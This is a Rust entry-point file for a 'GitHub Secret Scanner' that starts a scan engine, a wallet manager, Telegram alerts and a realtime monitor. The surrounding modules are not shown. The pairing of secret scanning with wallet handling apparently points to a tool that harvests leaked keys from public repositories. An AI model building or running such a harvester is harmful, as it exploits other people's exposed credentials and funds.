mod config;
mod core;
mod scanner;
mod patterns;
mod validators;
mod wallet;
mod telegram;
mod monitor;
mod models;
mod storage;

use std::sync::Arc;
use tracing::{info, warn, error};
use dotenv::dotenv;

#[global_allocator]
static ALLOC: jemallocator::Jemalloc = jemallocator::Jemalloc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    dotenv().ok();
    
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    info!("🚀 Starting GitHub Secret Scanner (Railway Mode)...");
    
    let config = config::Config::from_env()?;
    let config = Arc::new(config);
    
    info!("✅ Configuration loaded");
    
    // File-based storage (no MongoDB)
    let store = storage::file_store::FileStore::new();
    info!("✅ File storage initialized");
    
    // Initialize wallet manager
    let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
        Ok(wm) => {
            info!("✅ Wallet manager initialized");
            Arc::new(wm)
        }
        Err(e) => {
            error!("❌ Wallet manager failed: {}", e);
            return Err(e);
        }
    };
    
    // Initialize telegram (optional — agar env vars hain)
    let telegram = match telegram::alerts::TelegramAlerts::new(config.clone()) {
        Ok(ta) => {
            info!("✅ Telegram alerts initialized");
            Arc::new(ta)
        }
        Err(e) => {
            warn!("⚠️ Telegram init failed: {} — continuing without alerts", e);
            // Dummy telegram (no-op)
            Arc::new(telegram::alerts::TelegramAlerts::dummy())
        }
    };
    
    // Initialize cache
    let cache = core::cache::CacheManager::new();
    
    // Initialize scanner
    let scanner = scanner::engine::ScanEngine::new(
        config.clone(),
        cache.clone(),
        wallet_manager.clone(),
        telegram.clone(),
        store.clone(),
    );
    
    info!("🔧 Starting scanner...");
    
    let scan_handle = tokio::spawn(async move {
        scanner.run().await;
    });
    
    // Initialize monitor
    let monitor = monitor::realtime::RealtimeMonitor::new(
        config.clone(),
        store.clone(),
        telegram.clone(),
        wallet_manager.clone(),
    );
    
    info!("🔄 Starting monitor...");
    
    let monitor_handle = tokio::spawn(async move {
        monitor.run().await;
    });
    
    info!("✅ All systems running");
    
    tokio::signal::ctrl_c().await?;
    warn!("🛑 Shutting down...");
    
    scan_handle.abort();
    monitor_handle.abort();
    
    Ok(())
}